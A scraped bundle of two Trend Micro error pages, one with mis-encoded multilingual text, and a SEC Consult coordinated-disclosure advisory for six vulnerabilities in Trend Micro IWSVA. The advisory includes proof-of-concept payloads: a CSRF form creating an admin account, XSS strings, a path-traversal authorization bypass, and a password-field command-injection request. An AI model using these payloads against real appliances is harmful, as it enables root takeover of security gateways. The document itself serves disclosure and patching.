=== Content from success.trendmicro.com_11720031_20250119_112949.html ===


![web](https://content.powerapps.com/resource/powerappsportal/img/web.png)
You’re offline. This is a read only version of the page.
![close](https://content.powerapps.com/resource/powerappsportal/img/close.png)

[![Trend Micro Business Success Portal](/trendmicro_logo.webp)

Business Success](/)

* Products
* Resources
* [FAQ](/faq/)
* [Contact](/contactus/)

* [Log in](/SignIn)

#### Featured

Resources

---

* [Automation Center](https://automation.trendmicro.com/)
* [Education Portal](https://education.trendmicro.com/customer/learn)
* [Online Help Center](https://docs.trendmicro.com/en-US/documentation/)
* [Service Status](https://status.trendmicro.com/s/)
* [TrendConnect](https://success.trendmicro.com/trendconnect/)

---

### Automation Center

Trend Micro Automation Center is a central hub for APIs and documentation across Trend Micro products. It offers searchable cross-product APIs and use cases for IT and security teams to automate tasks and improve efficiency.

[Learn more](https://automation.trendmicro.com/)

### Education Portal

The Education Portal serves as a comprehensive resource for Trend Micro employees to develop their professional capabilities. Through a variety of curated training modules, employees can deepen their understanding of company culture, product knowledge, processes, and essential soft skills.

[Learn more](https://education.trendmicro.com/customer/learn)

### Online Help Center

The Trend Micro Online Help Center provides customers with comprehensive product information and troubleshooting guidance. It offers general product usage information and in-depth solutions for complex issues.

[Learn more](https://docs.trendmicro.com/en-US/documentation/%20)

### Service Status

Trend Micro Service Status Portal provides real-time information on the performance of Trend Micro products. It offers up-to-date incident reports and historical data for monitoring system health.

[Learn more](https://status.trendmicro.com/s/)

### TrendConnect

TrendConnect is a mobile application that provides users with real-time insights into their Trend Micro security environment, including threat alerts and system health assessments.

[Learn more](/trendconnect)

* Products
* Resources
* + [Service Status](https://status.trendmicro.com/s/)
  + [Education Portal](https://education.trendmicro.com/customer/learn)
  + [Automation Center](https://automation.trendmicro.com/)
  + [Online Help Center](https://docs.trendmicro.com/en-US/documentation/%20)
  + [TrendConnect](/trendconnect)
* [FAQ](/faq/)
* [Contact](/contactus/)
* [Log in](/Signin)
* + [Dashboard](/dashboard/)
  + [Profile](/profile/)
  + [Switch Account](/switch-account)
  + [Logout](/Account/Login/LogOff)

* [Home](/)
* Article unavailable

# Article unavailable

The requested knowledge article is unavailable. Please contact your portal administrator.

Feedback

Send us your feedback!
How was your experience on this website?

Satisfied

Neutral

Poor

Cancel

Submit

Thank you for your feedback

##### Support & Help

* [FAQ](/en-US/faq/)
* [Contact by Sales](https://www.trendmicro.com/en_us/business/get-info-form.html)

##### Resources

* [Automation Center](https://automation.trendmicro.com/)
* [Download Center](http://downloadcenter.trendmicro.com/)
* [Education Portal](https://education.trendmicro.com/customer/learn)
* [Online Help Center](https://docs.trendmicro.com/en-US/documentation/)
* [Service Status](https://status.trendmicro.com/s/%20)
* [TrendConnect Mobile App](/trendconnect)

##### Policies & Vulnerability

* [Support Policies](/en-US/support-policy/)
* [Legal Policies & Privacy](https://www.trendmicro.com/en_us/about/legal.html)
* [Vulnerability Response](/en-US/vulnerability-response/)

##### About Trend

* [Trend Micro](https://www.trendmicro.com/en_us/business.html)
* [Home & Home Office Support](https://helpcenter.trendmicro.com/en-us/)
* [Partner Portal](https://community-trendmicro.force.com/Gpartner/s/login/?language=en_US)
* [Trend Micro YouTube Channel](https://www.youtube.com/channel/UCyRUBssUwx5mpUM7ctVNr-A)

Copyright ©  Trend Micro Incorporated. All rights reserved.



=== Content from www.trendmicro.com_04f5b6fe_20250119_132127.html ===


| [Trend Micro](https://www.trendmicro.com) | |  | | --- | | |  | **Server Error** |  | | --- | --- | --- | |  |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

| Trend Micro is temporarily unavailable. Please try back later. In the meanwhile, you might find useful information on our [Support Center](http://esupport.trendmicro.com/support/supportcentral/supportcentral.do?locale=en_US). We apologize for any inconvenience.  Trend Micro ã«ã¬ã³ãã¼ã¯ä¸æçã«ãå©ç¨ããã ãã¾ããã ãã°ãããã¦ãããããä¸åº¦è©¦ãã¦ã¿ã¦ãã ããã ã¾ãã[ãã«ã ã»ã³ã¿ã¼](http://esupport.trendmicro.com/support/supportcentral/supportcentral.do?locale=en_US) (è±èª) ã§ããåé¡ã®è§£æ±ºã«å½¹ç«ã¤æå ±ãæä¾ãã¦ããã¾ãã ãä¸ä¾¿ãããããã¾ããä½åãäºæ¿ãã ããã  Trend Micro est momentanÃ©ment indisponible. Veuillez rÃ©essayer ultÃ©rieurement. En attendant, vous trouverez des informations utiles dans notre [Forum d'aide (en anglais uniquement)](http://esupport.trendmicro.com/support/supportcentral/supportcentral.do?locale=en_US). Nous vous prions de nous excuser des dÃ©sagrÃ©ments occasionnÃ©s.  Der Trend Micro-Service ist vorÃ¼bergehend nicht verfÃ¼gbar. Versuchen Sie es spÃ¤ter erneut. In der Zwischenzeit erhalten Sie nÃ¼tzliche Informationen in der [Trend Micro (nur auf Englisch verfÃ¼gbar)](http://esupport.trendmicro.com/support/supportcentral/supportcentral.do?locale=en_US/). Wir entschuldigen uns fÃ¼r eventuelle Unannehmlichkeiten.  Trend Micro no estarÃ¡ disponible temporalmente. Por favor, intenta acceder mÃ¡s tarde. Mientras tanto, puedes consultar el [Grupo de Ayuda (sÃ³lo en inglÃ©s)](http://esupport.trendmicro.com/support/supportcentral/supportcentral.do?locale=en_US), donde encontrarÃ¡s informaciÃ³n interesante. Disculpa las molestias.  Trend Micro is tijdelijk niet beschikbaar. Probeer het later nogmaals. In de tussentijd kun je nuttige informatie vinden in ons [discussiegroep (alleen in het Engels)](http://esupport.trendmicro.com/support/supportcentral/supportcentral.do?locale=en_US). Onze excuses voor het ongemak.  Trend Micro non Ã¨ temporaneamente disponibile. Riprova piÃ¹ tardi. Nel frattempo prova a consultare il nostro [Centro assistenza](http://esupport.trendmicro.com/support/supportcentral/supportcentral.do?locale=en_US) (solo in inglese) per trovare informazioni utili. Ci scusiamo per gli eventuali disagi causati.  O Trend Micro nÃ£o estÃ¡ disponÃ­vel no momento. Tente novamente mais tarde. Enquanto isso, vocÃª pode encontrar informaÃ§Ãµes Ãºteis na nossa [Central de Ajuda](http://esupport.trendmicro.com/support/supportcentral/supportcentral.do?locale=en_US) (apenas em inglÃªs). Pedimos desculpas por qualquer inconveniente.  Trend Micro ç¶²ç«æ«æç¡æ³ä½¿ç¨ï¼è«ç¨å¾åè©¦ãå¨æ­¤æéï¼æ¨å¯ä»¥å¨æåç[èªªæä¸­å¿](http://esupport.trendmicro.com/support/supportcentral/supportcentral.do?locale=en_US) (åè±æ) ä¸­æ¾å°æç¨çè³è¨ãå°æ¼é ææ¨çä»»ä½ä¸ä¾¿ï¼æåè¬¹æ­¤è´æ­ã  Trend Micro ç½ç«ææ¶ä¸å¯ç¨ï¼è¯·ç¨ååè¯ãå¨æ­¤æé´ï¼æ¨å¯ä»¥å¨æä»¬ç[æ¯æä¸­å¿](http://esupport.trendmicro.com/support/supportcentral/supportcentral.do?locale=en_US) (ä»æè±æç) æ¥æ¾æç¨çä¿¡æ¯ãå¯¹äºç±æ­¤å¸¦æ¥çä»»ä½ä¸ä¾¿ï¼æä»¬æ·±è¡¨æ­æã  Trend Micro jest tymczasowo niedostÄpny. SprÃ³buj ponownie pÃ³Åºniej. Tymczasem moÅ¼esz znaleÅºÄ przydatne informacje w naszym [Centrum pomocy](http://esupport.trendmicro.com/support/supportcentral/supportcentral.do?locale=en_US) (tylko w jÄzyku angielskim). Przepraszamy za wszelkie niedogodnoÅci.  Trend Micro Ã¤r inte tillgÃ¤ngligt fÃ¶r tillfÃ¤llet. FÃ¶rsÃ¶k igen senare. Under tiden kan du hitta anvÃ¤ndbar information i vÃ¥rt [hjÃ¤lpcenter](http://esupport.trendmicro.com/support/supportcentral/supportcentral.do?locale=en_US) (endast engelska). Vi ber om ursÃ¤kt fÃ¶r eventuellt besvÃ¤r.  Trend Micro er midlertidigt ikke tilgÃ¦ngelig. PrÃ¸v igen senere. I mellemtiden kan du muligvis finde brugbare oplysninger i vores [HjÃ¦lp](http://esupport.trendmicro.com/support/supportcentral/supportcentral.do?locale=en_US) (kun pÃ¥ engelsk). Vi beklager ulejligheden.  Trend Micro ìºë¦°ëë¥¼ ì ì ì¬ì©í  ì ììµëë¤. ëì¤ì ë¤ì ì´ì´ë³´ì­ìì¤. ê¶ê¸í ì ì´ ìì¼ë©´ ì°ì  [ëìë§ ì¼í°](http://esupport.trendmicro.com/support/supportcentral/supportcentral.do?locale=en_US) (ìì´ë§ ì§ì)ìì ì°¾ìë³´ì­ìì¤. ë¶í¸ì ë¼ì³ëë ¤ ì£ì¡í©ëë¤.  ÐÐ°Ð»ÐµÐ½Ð´Ð°ÑÑ Trend Micro Ð²ÑÐµÐ¼ÐµÐ½Ð½Ð¾ Ð½ÐµÐ´Ð¾ÑÑÑÐ¿ÐµÐ½. ÐÐ¾Ð²ÑÐ¾ÑÐ¸ÑÐµ Ð¿Ð¾Ð¿ÑÑÐºÑ Ð¿Ð¾Ð·Ð¶Ðµ. Ð Ð¿Ð¾ÐºÐ° Ð¿Ð¾Ð»ÐµÐ·Ð½ÑÑ Ð¸Ð½ÑÐ¾ÑÐ¼Ð°ÑÐ¸Ñ Ð¼Ð¾Ð¶Ð½Ð¾ Ð½Ð°Ð¹ÑÐ¸ Ð² Ð½Ð°ÑÐµÐ¼ [ÑÐ¿ÑÐ°Ð²Ð¾ÑÐ½Ð¾Ð¼ ÑÐµÐ½ÑÑÐµ](http://esupport.trendmicro.com/support/supportcentral/supportcentral.do?locale=en_US) (ÑÐ¾Ð»ÑÐºÐ¾ Ð½Ð° Ð°Ð½Ð³Ð»Ð¸Ð¹ÑÐºÐ¾Ð¼ ÑÐ·ÑÐºÐµ). ÐÑÐ¸Ð½Ð¾ÑÐ¸Ð¼ Ð¸Ð·Ð²Ð¸Ð½ÐµÐ½Ð¸Ñ Ð·Ð° Ð¿ÑÐ¸ÑÐ¸Ð½ÐµÐ½Ð½ÑÐµ Ð½ÐµÑÐ´Ð¾Ð±ÑÑÐ²Ð°.  Trend Micro er midlertidig utilgjengelig. PrÃ¸v igjen senere. I mellomtiden kan du finne nyttig informasjon i [BrukerstÃ¸tten](http://esupport.trendmicro.com/support/supportcentral/supportcentral.do?locale=en_US) (bare pÃ¥ engelsk). Vi beklager eventuelle ulemper dette medfÃ¸rer.  Trend Micro on vÃ¤liaikaisesti poissa kÃ¤ytÃ¶stÃ¤. YritÃ¤ myÃ¶hemmin uudelleen. Voit lÃ¶ytÃ¤Ã¤ hyÃ¶dyllisiÃ¤ tietoja [ohjekeskuksestamme](http://esupport.trendmicro.com/support/supportcentral/supportcentral.do?locale=en_US) (vain englanniksi). Pahoittelemme tilanteesta mahdollisesti aiheutuvaa haittaa.  Trend Micro Takvim geÃ§ici olarak kullanÄ±m dÄ±ÅÄ±dÄ±r. LÃ¼tfen daha sonra tekrar deneyin. Bu arada, [YardÄ±m Merkezimizde](http://esupport.trendmicro.com/support/supportcentral/supportcentral.do?locale=en_US) (yalnÄ±zca Ä°ngilizce) yararlÄ± bilgiler bulabilirsiniz. Bu durum iÃ§in Ã¶zÃ¼r dileriz. |
| --- |



=== Content from sec-consult.com_1f1ab18b_20250119_112947.html ===

Toggle Navbar

* [Career](/career/)
* [About us](/about-us/)
* [Contact](/contact/)

* EN
  + [DE](/de/vulnerability-lab/advisory/mehrere-kritische-schwachstellen-in-trend-micro-interscan-web-security-virtual-appliance-iwsva/ "German")
Search

* Compliance & Regulations
  + [NIS2](/compliance-regulations/nis2/)
  + [Digital Operational Resilience Act (DORA)](/compliance-regulations/dora/)
* Security Testing
  + [Web Application Security](/security-testing/web-application-security/)
  + [Penetration Testing](/security-testing/penetration-testing/)
  + [Mobile Security](/security-testing/mobile-security/)
  + [Cloud Security](/security-testing/cloud-security/)
  + [IT Infrastructure Security](/security-testing/it-infrastructure-security/)
  + [Security for SAP Services](/security-testing/security-for-sap-services/)
  + [IoT and Embedded Systems Security](/security-testing/iot-and-embedded-systems-security/)
  + [Red Teaming](/security-testing/red-teaming/)
* Processes & Organisation
  + [Information Security Management (ISM)](/processes-organisation/information-security-management-ism/)
  + [OT Security](/processes-organisation/ot-security/)
  + [Secure Software Development Consulting](/processes-organisation/secure-software-development/)
  + [Red Teaming](/security-testing/red-teaming/)
  + [SEC Trainings](/processes-organisation/sec-trainings/)
  + [Project- und Program Management](/processes-organisation/project-und-program-management/)
* Incident Response
  + [SEC Defence](/incident-response/sec-defence/)
* [Vulnerability Lab](/vulnerability-lab/)
* [Blog](/blog/)
 [Incident?
Breached?
Report an incident](/incident-response/sec-defence/)

1. [Home](/)
2. [Vulnerability Lab](/vulnerability-lab/)
3. Multiple critical vulnerabilities in Trend Micro InterScan Web Security Virtual Appliance (IWSVA)
# Multiple critical vulnerabilities in Trend Micro InterScan Web Security Virtual Appliance (IWSVA)

Title

Multiple critical vulnerabilities

Product

Trend Micro InterScan Web Security Virtual Appliance (IWSVA)

Vulnerable Version

< IWSVA 6.5 SP2 EN Patch 4 Build 1919

Fixed Version

IWSVA 6.5 SP2 EN Patch 4 Build 1919

CVE Number

CVE-2020-8461, CVE-2020-8462, CVE-2020-8463, CVE-2020-8464, CVE-2020-8465, CVE-2020-8466

Impact

critical

Homepage

[https://www.trendmicro.com/en\_us/business/products/user-protection/sps/web-security/interscan-web-security-virtual-appliance.html](https://www.trendmicro.com/en_us/business/products/user-protection/sps/web-security/interscan-web-security-virtual-appliance.html "https://www.trendmicro.com/en_us/business/products/user-protection/sps/web-security/interscan-web-security-virtual-appliance.html")

Found

15.07.2019

By

Wolfgang Ettlinger (Office Vienna) SEC Consult Vulnerability Lab

The Trend Micro InterScan Web Security Virtual Appliance (IWSVA) is affected by multiple critical security issues. Unauthenticated attackers are able to gain root access to the appliance via chained attack vectors, such as CSRF protection bypass, authorization & authentication bypass, command execution and unauthenticated command injection vulnerabilities.

## Vendor description

*"The web has rapidly become a top threat vector for business. In addition to blocking malicious code, inappropriate websites, and targeted attacks, security managers are also being asked to secure the expanding use of Web 2.0 and cloud-based applications, while reducing overhead and bandwidth costs.*

*Trend Micro™ InterScan™ Web Security Virtual Appliance is an on-premises secure web gateway that gives you superior protection against dynamic online threats, while providing you with real-time visibility and control of employee internet usage. Interscan Web Security is also available in the cloud as a service."*

URL: <https://www.trendmicro.com/en_us/business/products/user-protection/sps/web-security/interscan-web-security-virtual-appliance.html>

## Business recommendation

The vendor provides a patch which should be installed immediately.

Customers should also adhere to security best practices such as network segmentation, limiting access to the admin panel or admins not being logged on while surfing the web for CSRF mitigation.

SEC Consult highly recommends to perform a thorough security review of this and similar Trend Micro products conducted by security professionals to identify and resolve all security issues. Based on the identified issues it is possible that further critical issues exist in those products.

## Vulnerability overview/description

### 1) CSRF Protection Bypass (CVE-2020-8461)

The IWSVA web interface checks that every request contains a valid CSRF token. However, this check does not apply if the request contains a body that is encoded as multipart/form-data. Therefore, an attacker can simply get the victim's browser to send any request encoded as multipart/form-data without requiring a valid CSRF token.

### 2) Cross-Site Scripting (CVE-2020-8462)

Several stored and reflected Cross-Site Scripting vulnerabilities have been identified in the IWSVA web interface.

### 3) Authorization Bypass (CVE-2020-8463)

A global authorization check is performed to allow anonymous users access to a very restricted set of paths (e.g. the login page). This check is performed by checking that the first part of the requested path matches one of the allowed paths (e.g. `logon.jsp`). This verification can be bypassed by sending request paths in the form of `/logon.jsp/../<actual path>` which allows accessing other scripts.

### 4) Authentication Bypass/SSRF (CVE-2020-8464)

The IWSVA administration web interface does not perform all authentication checks if the request is sent from localhost. However, as the IWSVA also operates as an HTTP proxy, an attacker can send requests that appear to come from localhost by accessing the admin interface through the proxy. This behavior also exposes the administration interface to users that would normally only have access to the HTTP proxy of the appliance.

### 5) Command Execution (CVE-2020-8465)

The IWSVA's update functionality allows administrators to upload system updates provided by Trend Micro™ to the web interface. The code contained in these updates is executed as root. No code authenticity checks are performed before applying the update. Therefore, by combining this behavior with the previous vulnerabilities an unauthenticated attacker can execute code as user root.

### 6) Unauthenticated Command Injection (CVE-2020-8466)

When the improved password hashing method is enabled (see release notes for Service Pack 2 Patch 3 for instructions how to enable it) the appliance is vulnerable to a command injection vulnerability affecting the password submitted during login. Therefore, an unauthenticated attacker is able to execute commands by providing a manipulated password.

## Proof of concept

### 1) CSRF Protection Bypass (CVE-2020-8461)

The following fragment demonstrates this issue by adding the user "attacker" by using the form enctype "multipart/form-data":

```

<form action="https://<host>:8443/servlet/com.trend.iwss.gui.servlet.updateaccountadministration?accountop=add&allaccount=admin&accountType=local&accountnamelocal=attacker&accounttype=0&password_changed=true&PASS1=test&PASS2=test&description=&role_select=1&roleid=1"
     method="POST"
     enctype="multipart/form-data">
   <input type="hidden" name="x" value="y" />
   <input type="submit" value="Send" />
</form>

```
### 2) Cross-Site Scripting (CVE-2020-8462)

The following instances of stored and reflected cross-site scripting vulnerabilities have been identified (all of these can be combined with CSRF protection bypass).

* Adding a user e.g. with the description `<img src=x onerror=alert(1)>` Executed in the user overview (`login_accounts.jsp`)
* Sending a POST request like `/logon_report.jsp?"><script>alert(1)</script>` (this only works in Internet Explorer as other browsers URL-encode some of these characters)
* The following path demonstrates a reflected XSS: `/change_status.jsp?settings=--><script>alert(1)</script>`

### 3) Authorization Bypass (CVE-2020-8463)

The following path demonstrates how the global authorization filter can be bypassed. The effects of this vulnerability alone were not further investigated. Only the effects when combined with vulnerability #4 were researched.

`/logon.jsp/../<anything>.jsp`

### 4) Authentication Bypass/SSRF (CVE-2020-8464)

The following script demonstrates how the proxy of the appliance at port 8080 can be used to access the administration interface. Vulnerability #3 was used to bypass the global authorization filter. The request is being sent through the proxy and because it appears to come from localhost other security mechanisms are bypassed. This script adds a user "attacker".

[ Python exploit script removed from this advisory ]

### 5) Command Execution (CVE-2020-8465)

Updates to the IWSVA are released as Tar-Gz files that are structured as follows:

```

update.tgz
 MD5SUM.txt                    contains the output of md5sum *
 stargate_patch.tgz
   stargate_patch.ini          contains metadata
   stargate_patch_apply.sh     executed during update

```

The file contains no signature that is checked before the update is applied. The code in `stargate_patch_apply.sh` can be executed with a single request.

Note: As file uploads are always sent as multipart/form-data the CSRF filter is ineffective for system updates.

### 6) Unauthenticated Command Injection (CVE-2020-8466)

The following request demonstrates this issue:

```

POST /uilogonsubmit.jsp HTTP/1.1
Host: testhost:8443
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

uid=admin&passwd=`id`+>/tmp/test+%23

```

After this request has been executed, the file /tmp/test contains the following:

`uid=498(iscan) gid=499(iscan) groups=499(iscan)`

When combining these vulnerabilities the following attack chains are possible:

* An attacker on the internet could abuse the CSRF and Command Execution vulnerability to take over the appliance as root.
* An attacker with access to the HTTP proxy port could abuse the authentication/authorization bypass vulnerabilities and the Command Execution vulnerability to take over the appliance as root without user/admin interaction.

A python exploit script that demonstrates the latter attack scenario has been developed and provided to Trend Micro, which will not be released. Instead, a short PoC video showing that an unauthenticated attacker can take over the appliance as root has been made:

<https://youtu.be/Chl2OeIi2xI>

![](/fileadmin/_processed_/7/7/csm_c-trendmicro-poc_5667eaf5bf.png)
## Vulnerable / tested versions

The version IWSVA 6.5 SP2 EN Patch 4 Build 1844 with Patch cpb1852 was tested. This was the latest version at the time of discovery.

## Vendor contact timeline

| 2019-08-14 | Contacting vendor through security@trendmicro.com Submitting advisory information encrypted (PGP). |
| --- | --- |
| 2019-08-14 | Vendor reply, they will take a look at the issue. |
| 2019-08-14 | SEC Consult provides additional information/notes and potential other security issues not included in the advisory as more internal product information & time would be necessary to further investigate them. |
| 2019-09-02 | Vendor reviewed and analyzed the advisory reports, having difficulties and needing more detailed steps to recreate and exploit the vulnerabilities CSRF could not be exploited/simulated internally, as a "CSRF token" is required. |
| 2019-09-02 | SEC Consult explained how and why CSRF is exploitable again, e.g. when the user admin is logged in and the PoC form is sent, a new user is automatically created. Asking the vendor whether we tested the latest available version (IWSVA 6.5SP2 EN Patch 4 Build 1844 (w/cpb1852)). |
| 2019-09-03 | Vendor is asking about more details on the other reported vulnerabilities; More detailed steps in recreating and exploiting the issues are requested. Furthermore, info on how the form data for the CSRF PoC is being sent. |
| 2019-09-03 | SEC Consult provides video how the CSRF issue can be exploited easily. Asking what further details would be necessary for the other vulnerabilities as we believe the proof of concepts to be sufficient to verify them |
| 2019-09-17 | No reply; asking vendor about the status. |
| 2019-09-19 | Vendor was able to verify only two vulnerabilities (CSRF & XSS) Claimed CSRF attack might not be feasible as attacker would require an authenticated admin's cookie. First fixes for XSS have been implemented by vendor. Issue 3, 4 and 6 could not be reproduced by vendor, PoC similar to the video requested. Analysis of issue 5 is ongoing. |
| 2019-09-19 | Explaining to the vendor what CSRF is and also providing external info such as OWASP; Requesting specifics on why vulnerabilities could not be reproduced. Asking for information when vendor expects to be able to provide a patch. |
| 2019-09-25 | Trend Micro PSIRT: no timeline can be provided currently as issues could not be reproduced yet. |
| 2019-09-27 | SEC Consult postpones advisory release, asking whether further support is needed. |
| 2019-10-11 | Asking if vulnerabilities could be reproduced by now. |
| 2019-10-11 | Trend Micro PSIRT: development team worked on the last three vulnerabilities (4-6), update will follow next week. |
| 2019-10-21 | Vendor sends PGP encrypted message that can't be decrypted. |
| 2019-10-23 | Vendor re-sends message unencrypted; vendor made some progress. Further info regarding the additionally provided notes requested. |
| 2019-10-23 | SEC Consult: providing more info again. |
| 2019-10-30 | Asking vendor again regarding release date |
| 2019-11-04 | Trend Micro PSIRT: Testing completed, patch should be ready today, localization needs more time. Discussing further responsible disclosure steps. |
| 2019-11-09 | Trend Micro PSIRT: No ETA yet on final patch because of localization. |
| 2019-11-29 | Asking for a status update. |
| 2019-12-10 | Trend Micro PSIRT: unexpected issues encountered, intended fix has been rolled back. Should know further information by end of the week. |
| 2020-01-08 | Asking for a status update. |
| 2020-01-13 | Trend Micro PSIRT: development team committed to complete the new fix ETA on or before Feb 4 |
| 2020-01-16 | SEC Consult confirms release date for 4th February. Proposing to schedule our advisory release for 19th February to give end users more time to patch the highly critical issues. |
| 2020-01-27 | No reply yet; SEC Consult informs vendor that we expect the patch to be released on 4th February and plan the advisory release for 19th February. |
| 2020-01-29 | Vendor sends PGP-encrypted email only for their email address; asking to resend it. Vendor resends email: Vendor is still working on patch (localization for different regions), should be available by February "if all goes well". Cannot commit to disclosure date yet,new date will be proposed. |
| 2020-01-29 | Taking next responsible disclosure steps, contacting CERT-Bund and CERT.at regarding scheduled release. |
| 2020-01-29 | Asking vendor for further patch information (fixed & affected versions) and regarding CVE numbers. |
| 2020-01-30 | Telephone call with Trend Micro Germany. |
| 2020-02-03 | Telephone call with Trend Micro Germany. |
| 2020-02-04 | Trend Micro Germany: CP 1884 will be ready on 7th February. |
| 2020-02-04 | Asking whether all security issues have been fixed, postponing security advisory release to 24th February, asking again for affected versions, CVE numbers, etc. |
| 2020-02-06 | Trend Micro Germany: Hotfix is now available |
| 2020-02-06 | Asking whether all issues have been fixed, based on the release notes it seems to us that XSS has not been fixed properly and only the "X-XSS-Protection" header has to be configured by admins now. Asking vendor for further info on this. |
| 2020-02-07 | Trend Micro Germany: The patch addresses all identified security issues: 1) CSRF Protection Bypass > VRTS-3552 2) Cross-Site Scripting > VRTS-3257 3) Authorization Bypass > VRTS-3554 4) Authentication Bypass/SSRF > VRTS-3555 5) Command Execution > VRTS-3556 6) Unauthenticated Command Injection > VRTS-3557 |
| 2020-02-09 | Trend Micro PSIRT: there will be a security bulletin by the vendor which includes the CVE numbers, no date yet because of localization. |
| 2020-02-11 | Asking vendor again regarding the new "xss\_protect" key in the configuration and to please share the CVE numbers when they are available. |
| 2020-02-14 | No answer from vendor yet. Performed recheck of the critical patch b1884and identified that most of the security issues have not or improperly been fixed. Notifying BSI/CERT-Bund, CERT.at and Trend Micro PSIRT & Trend Micro Germany to discuss next steps, providing a detailed recheck analysis report. |
| 2020-02-15 | Trend Micro PSIRT: issue has been escalated with highest priority. Defective patch has been removed from download center. |
| 2020-02-18 | Trend Micro PSIRT provides analysis on submitted recheck report, SEC Consult provides feedback why some of the issues are still exploitable. |
| 2020-02-20 | Trend Micro PSIRT: feedback is reviewed by developers. |
| 2020-03-04 | Asking for a status / schedule update. |
| 2020-03-04 | Trend Micro PSIRT: the patch will be a major rework (similar to service pack) 20th April is being targeted for patch validation, 30th April for release. |
| 2020-03-05 | Informing Trend Micro that we have reserved some time for patch validation end of April |
| 2020-04-09 | Asking for a status update if the patch is still planned for 20th April |
| 2020-04-15 | Trend Micro PSIRT: patch delayed, new patch ETA is 30th April |
| 2020-04-29 | Trend Micro PSIRT: IWSVA CP pre-release build is ready for verification. |
| 2020-05-03 | Informing Trend Micro that most identified vulnerabilities could still be easily bypassed and were not patched properly, review not finished yet. |
| 2020-05-05 | Sending Trend Micro the revised, detailed recheck report outlining that VRTS-3552 - CSRF Protection Bypass (#1) => not fixed properly VRTS-3257 - XSS => fixed but new XSS filter has not been reviewed (new "xss\_protect\_all" config value) VRTS-3554 - Authorization Bypass => not fixed properly VRTS-3555 - Authentication Bypass/SSRF (#3) => not fixed properly VRTS-3556 - Command Execution => not fixed properly VRTS-3557 - Unauthenticated Command Injection => fixed |
| 2020-05-06 | Clarifying questions regarding the document |
| 2020-05-26 | Asking if patch will be available on 2020-06-02 |
| 2020-05-26 | Patch will be available for verification on 2020-06-01 |
| 2020-05-29 | Trend Micro PSIRT provides debug patch |
| 2020-06-08 | Sending recheck report document VRTS-3552 - CSRF Protection Bypass (#1) => fixed VRTS-3554 - Authorization Bypass => fixed VRTS-3555 - Authentication Bypass/SSRF (#3) => not fixed properly VRTS-3556 - Command Execution => partially fixed |
| 2020-07-07 | Trend Micro PSIRT provides debug patch |
| 2020-07-09 | Sending recheck report document VRTS-3555 - Authentication Bypass/SSRF (#3) => partially fixed VRTS-3556 - Command Execution => partially fixed |
| 2020-07-16 | Contacting vendor, coordination of patch & advisory release date |
| 2020-08-04 | Asking for a status update |
| 2020-08-24 | Asking for a status update |
| 2020-09-18 | Asking for a status update; Answer: "The hotfix is ready, however, the official critical patch to be used for public disclosure is still being finalized"; disclosure date will be communicated later |
| 2020-10-23 | Asking for a status update |
| 2020-10-29 | Trend Micro PSIRT: dev team is still working on a fix, integrating some other components/solutions |
| 2020-11-11 | Asking for estimated patch release date; no response |
| 2020-11-27 | Asking again for estimated patch release date |
| 2020-11-29 | Trend Micro PSIRT: Patch should be available in a few weeks |
| 2020-12-10 | Trend Micro PSIRT: Patch is available, provides CVE numbers, security bulletin will be released on 15th December |
| 2020-12-10 | Informing German BSI/CERT-Bund and CERT.at about the patch release and bulletin date, TLP GREEN. |
| 2020-12-10 | Asking vendor about the new "xss\_protect\_all" config value to enable the XSS filter, if it is enabled by default now, as it is not mentioned in the latest release notes and only the variable "xss\_protect" in previous builds. Telling the vendor that we are releasing our advisory on 17th December. |
| 2020-12-13 | Trend Micro PSIRT: "xss\_protect\_all" is enabled by default. Adjusting solution in advisory, follow-up question about "xss\_protect". |
| 2020-12-15 | Trend Micro security bulletin release |
| 2020-12-17 | Coordinated release of security advisory |

## Solution

The vendor provides a patch which should be installed immediately. The release notes can be found here:
<https://files.trendmicro.com/documentation/readme/iwsva_65-sp2_en/iwsva_6.5-sp2_ar64_en_criticalpatch_b1919_EN_Readme.txt>

Patch download:
<https://files.trendmicro.com/products/iwsva_65-sp2_en/iwsva_65_sp2_ar64_en_criticalpatch_b1919.zip>
 (According to vendor, ensure that you have installed IWSVA 6.5 Service Pack 2 Hotfix 1912)

Download center URL:
<https://downloadcenter.trendmicro.com/index.php?regs=de&prodid=86>

Trend Micro Security Bulletin:
<https://success.trendmicro.com/solution/000283077>

**Important:** There are new XSS protection config values "xss\_protect" and "xss\_protect\_all" in order to enable the new XSS filter. "xss\_protect\_all" is enabled by default according to the vendor.

Description from Trend Micro to enable the "xss\_protect" variable from previous release notes:

1. Install the hotfix
 2. SSH to the IWSVA shell.
 3. Open the "/var/iwss/intscan.ini" file.
 4. Locate the "http" section.
 5. Add the following key and set it to "enable".

```

   [http]
   xss_protect=enable
```

6. Save the changes and close the file.
 7. Restart the web console service.

Customers should also adhere to security best practices such as network segmentation, limiting access to the admin panel or admins not being logged on while surfing the web for CSRF mitigation.

## Workaround

none

## Advisory URL

[Vulnerability Lab](/vulnerability-lab/)

EOF W. Ettlinger, J. Greil / @2020

[Back](/vulnerability-lab/)

* [Legal Notice](/legalnotice/)
* [Privacy Statement](/privacy-statement/)
* [Jobs](/career/)

SEC Consult is one of the leading consultancies in the field of cyber and [application security](/security-testing/web-application-security/ "Web Application Security"). The company specializes in [information security management](/processes-organisation/information-security-management-ism/ "Information Security Management (ISM)"), NIS security audits, [penetration testing](/security-testing/penetration-testing/ "Pentesting (Pentest)"), ISO 27001 certification support, [Cyber Defence](/incident-response/sec-defence/ "Cyber Defence") and [secure software certification](/processes-organisation/secure-software-development/ "Secure Software Development Consulting"). SEC Consult is part of [Eviden](https://eviden.com/ "Link to Eviden website").

[![bsi ISO/IEC 27001 Information Security Management CERTIFIED](/typo3temp/assets/_processed_/c/2/csm_bsi_9a24e74563.png)](/about-us/ "About us")[![ISO 27001 CREST certified](/typo3temp/assets/_processed_/0/6/csm_crest_0eb9c5864d.png)](/about-us/ "About us")[![Great Place To Work AT certified](/typo3temp/assets/_processed_/0/3/csm_great-place-to-work-at_773b265aa6.png)](/about-us/ "About us")[![Great Place To Work DE certified](/typo3temp/assets/_processed_/d/6/csm_great-place-to-work-de_2fcb537270.png)](/about-us/ "About us")

## We use Cookies

We use cookies to offer you a perfect visit experience. These include cookies that are necessary for the operation of the site and for the control of our commercial corporate goals, as well as those that are only used for anonymous statistical purposes, for convenience settings or to display personalized content. Decide for yourself which categories you want to allow. Please note that based on your settings, not all functions of the site may be available.

**[Legal Notice](/legalnotice/)** •  **[Privacy Statement](/privacy-statement/)**

### Technically required

(
0
Service
)

no

Technically required (
0
Service
)

yes

